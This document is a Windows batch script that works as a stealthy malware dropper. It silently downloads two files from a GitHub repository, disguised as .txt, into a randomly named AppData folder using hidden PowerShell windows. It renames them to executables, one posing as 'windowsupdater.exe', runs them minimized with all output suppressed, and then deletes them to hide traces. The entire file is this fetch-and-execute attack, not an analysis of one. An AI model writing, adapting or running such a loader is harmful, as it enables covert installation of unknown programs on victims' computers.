@echo off
REM Suppress command output
setlocal enabledelayedexpansion

REM Generate a unique folder name based on the current timestamp or GUID
for /f "delims=" %%a in ('powershell -Command "[guid]::NewGuid().ToString()"') do set FOLDER=%%a

REM Define URLs for the EXEs (text files with EXE content)
set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Bot_detector.txt
set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/windowsupdater.txt

REM Create a unique folder in AppData\Local to store the downloaded EXEs
set APPDATA_FOLDER=%LOCALAPPDATA%\%FOLDER%
mkdir "%APPDATA_FOLDER%" >nul 2>&1

REM Download the .txt files and save them as EXEs in the unique folder
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%U1%' -OutFile '%APPDATA_FOLDER%\Messageboxtest1.txt' > $null 2>&1"
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%U2%' -OutFile '%APPDATA_FOLDER%\Messageboxtest2.txt' > $null 2>&1"

REM Rename the .txt files to .exe
ren "%APPDATA_FOLDER%\Messageboxtest1.txt" "Mexso.exe" >nul 2>&1
ren "%APPDATA_FOLDER%\Messageboxtest2.txt" "windowsupdater.exe" >nul 2>&1

REM Execute the EXEs from the unique AppData folder
start /min "" "%APPDATA_FOLDER%\Mexso.exe" >nul 2>&1
start /min "" "%APPDATA_FOLDER%\windowsupdater.exe" >nul 2>&1

REM Optional: Clean up the downloaded EXEs after execution (if desired)
del "%APPDATA_FOLDER%\Mexso.exe" >nul 2>&1
del "%APPDATA_FOLDER%\windowsupdater.exe" >nul 2>&1

exit
